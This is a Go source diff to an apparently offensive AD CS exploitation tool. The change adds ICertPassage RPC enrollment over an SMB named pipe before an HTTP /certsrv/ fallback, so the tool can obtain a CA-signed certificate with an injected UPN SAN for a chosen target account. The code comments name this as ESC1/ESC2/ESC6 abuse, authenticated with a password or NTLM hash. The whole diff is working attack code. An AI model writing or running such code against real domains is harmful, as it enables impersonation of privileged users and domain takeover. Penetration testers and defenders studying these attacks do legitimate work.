@@ -101,49 +101,61 @@ func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInjec
 	}
 	fmt.Printf("[+] CSR generated (CN=%s, SAN in CSR: %v)\n", targetUPN, !sanInject)
 
-	// Discover CA hostname via enrollment services
+	// Discover CA hostname and name via enrollment services
 	caHostname := ""
+	caName := ""
 	services, err := EnumerateEnrollmentServices(cfg)
 	if err != nil {
 		fmt.Printf("[!] Warning: could not enumerate enrollment services: %v\n", err)
 	} else if len(services) > 0 {
 		caHostname = services[0].DNSHostName
-		fmt.Printf("[+] Discovered CA web enrollment endpoint: %s\n", caHostname)
+		caName = services[0].Name
+		fmt.Printf("[+] Discovered CA: %s (%s)\n", caName, caHostname)
 	}
 
 	if caHostname == "" {
-		fmt.Printf("[!] WARNING: No CA web enrollment endpoint discovered\n")
+		fmt.Printf("[!] WARNING: No CA endpoint discovered\n")
 		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
 		return forgeFallback(certKey, targetUPN)
 	}
 
-	// Verify credentials for web enrollment (password OR hash required)
+	// Verify credentials for enrollment (password OR hash required)
 	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "") {
-		fmt.Printf("[!] WARNING: No username/password/hash for web enrollment NTLM auth\n")
+		fmt.Printf("[!] WARNING: No username/password/hash for enrollment NTLM auth\n")
 		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
 		return forgeFallback(certKey, targetUPN)
 	}
 
-	// Always pass UPN SAN via CertAttrib request attributes.
-	// certsrv web enrollment ignores SAN extensions in the CSR — it only
-	// processes SAN from request attributes. This is required for ESC1/ESC2
-	// (enrollee supplies subject) and ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2).
+	// Try RPC enrollment first (ICertPassage over SMB named pipe).
+	// RPC enrollment properly honors the UPN SAN from the CSR when
+	// CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set. Web enrollment does NOT.
+	fmt.Printf("[*] Attempting RPC enrollment via \\\\%s\\pipe\\cert...\n", caHostname)
+	cert, rpcErr := EnrollCertificateRPC(cfg, caHostname, caName, templateName, csrDER)
+	if rpcErr == nil {
+		fmt.Printf("[+] CA-signed certificate obtained for %s (via RPC)\n", targetUPN)
+		return cert, certKey, nil
+	}
+	fmt.Printf("[!] RPC enrollment failed: %v\n", rpcErr)
+	fmt.Printf("[*] Falling back to HTTP web enrollment...\n")
+
+	// Fall back to HTTP web enrollment (/certsrv/)
+	// Pass UPN SAN via CertAttrib request attributes (only works if
+	// EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled on the CA — ESC6).
 	sanAttrib := ""
-	if targetUPN != "" {
+	if targetUPN != "" && sanInject {
 		sanAttrib = fmt.Sprintf("SAN:upn=%s", targetUPN)
 		fmt.Printf("[*] SAN via request attributes: %s\n", sanAttrib)
 	}
 
-	// Submit CSR via HTTP web enrollment
 	fmt.Printf("[*] Submitting CSR to %s/certsrv/...\n", caHostname)
-	cert, err := submitCSRHTTP(cfg, caHostname, csrDER, templateName, sanAttrib)
+	cert, err = submitCSRHTTP(cfg, caHostname, csrDER, templateName, sanAttrib)
 	if err != nil {
 		fmt.Printf("[!] WARNING: Web enrollment failed: %v\n", err)
 		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
 		return forgeFallback(certKey, targetUPN)
 	}
 
-	fmt.Printf("[+] CA-signed certificate obtained for %s\n", targetUPN)
+	fmt.Printf("[+] CA-signed certificate obtained for %s (via HTTP)\n", targetUPN)
 	return cert, certKey, nil
 }
 
